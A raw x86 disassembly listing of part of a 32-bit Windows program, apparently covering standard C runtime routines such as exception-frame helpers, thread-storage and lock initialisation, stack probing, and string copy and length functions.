  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
